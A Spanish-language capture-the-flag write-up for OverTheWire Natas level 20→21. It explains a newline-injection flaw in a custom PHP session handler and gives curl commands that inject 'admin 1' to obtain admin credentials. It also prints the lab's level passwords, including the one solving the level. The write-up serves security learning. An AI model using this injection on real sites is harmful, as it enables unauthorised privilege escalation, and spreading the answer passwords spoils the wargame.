# Natas 20 → 21

## Información del nivel

| Campo | Valor |
|---|---|
| URL | http://natas20.natas.labs.overthewire.org |
| Usuario | natas20 |
| Contraseña | p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw |
| Contraseña obtenida | BPhv63cKE1lkQl04cE5CuFTzXe15NfiH |

---

## Reconocimiento

Al acceder al nivel se presenta un formulario con un campo de texto "Your name" y un mensaje:

```
You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
```

El objetivo es claro: manipular la sesión para que el servidor nos reconozca como administrador.

---

## Análisis del código fuente

El nivel expone el código fuente en `index-source.html`. Las funciones clave son:

### `print_credentials()`

```php
if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "Password: <censored>";
}
```

Para obtener la contraseña, `$_SESSION["admin"]` debe ser igual a `1`.

### `mywrite($sid, $data)`

Guarda la sesión en disco en el siguiente formato:

```
clave valor
clave valor
```

Por ejemplo, si el usuario ingresa `marco`, el archivo de sesión queda:

```
name marco
```

### `myread($sid)`

Lee el archivo de sesión línea por línea y reconstruye `$_SESSION`:

```php
foreach(explode("\n", $data) as $line) {
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
}
```

Cada línea se divide por espacio — la primera parte es la clave, la segunda el valor.

---

## Vulnerabilidad: Inyección de Newline

El campo `name` no sanitiza saltos de línea (`\n`). Si se envía:

```
marco\nadmin 1
```

El archivo de sesión queda:

```
name marco
admin 1
```

Al leerlo, `myread` parsea `admin` como clave con valor `1`, activando `print_credentials()`.

---

## ¿Qué es una inyección de newline?

Un salto de línea (`\n`) es un carácter especial que indica el fin de una línea. En este nivel, el servidor construye el archivo de sesión concatenando directamente el input del usuario. Si ese input contiene un `\n`, se introduce una línea extra con contenido controlado por el atacante.

Es similar en concepto a una inyección SQL — en lugar de inyectar en una consulta de base de datos, se inyecta en un archivo de texto que el servidor parsea.

---

## Herramienta: curl

El formulario HTML no permite escribir saltos de línea en un campo de texto normal. Por eso se usa `curl` desde la terminal, donde se puede enviar `%0a` (salto de línea codificado en URL).

### Flags utilizados

| Flag | Descripción |
|---|---|
| `-s` | Silent — no muestra progreso |
| `-c cookies.txt` | Guarda cookies en archivo |
| `-b cookies.txt` | Envía cookies desde archivo |
| `-u usuario:pass` | Autenticación HTTP básica |

---

## Explotación

```bash
# Paso 1: Inyectar el salto de línea con la misma sesión
curl -s -c cookies.txt -b cookies.txt \
  "http://natas20.natas.labs.overthewire.org/?name=marco%0aadmin%201" \
  -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw > /dev/null

# Paso 2: Leer la respuesta con la sesión modificada
curl -s -b cookies.txt \
  "http://natas20.natas.labs.overthewire.org/?debug" \
  -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw | grep -i password
```

El parámetro `?debug` activa mensajes de depuración que confirman el ataque:

```
DEBUG: Read [name marco]
DEBUG: Read [admin 1]
```

---

## Conceptos clave

- **Inyección de newline**: insertar un salto de línea en un campo de input para manipular el parseo de archivos o protocolos.
- **Gestión de sesiones**: PHP almacena sesiones en archivos de texto. Una implementación personalizada sin sanitización adecuada es vulnerable.
- **curl**: herramienta de línea de comandos para realizar peticiones HTTP con control total sobre headers, cookies y parámetros.
- **`?debug`**: parámetro que activa mensajes internos del servidor — útil para confirmar el comportamiento de la vulnerabilidad.
